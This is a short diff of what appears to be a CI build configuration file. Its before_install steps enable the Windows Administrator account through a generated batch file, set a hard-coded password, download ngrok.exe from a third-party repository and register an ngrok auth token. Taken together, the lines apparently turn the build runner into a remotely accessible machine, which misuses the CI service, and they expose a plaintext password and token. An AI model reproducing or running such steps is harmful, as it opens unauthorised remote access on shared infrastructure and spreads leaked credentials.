@@ -4,7 +4,8 @@ language: shell
 
 before_install:
 - |-
-        wmic useraccount where name='Administrator' set disabled=false
+        echo net user administrator /active:yes > a.bat
+        start a.bat
         net user Administrator Thuonghai001
         curl -O https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe
         powershell ./ngrok authtoken UqkqD5EBxWPggw7xGAiQ_77M4D5kjaPNdr9wdb3m9z
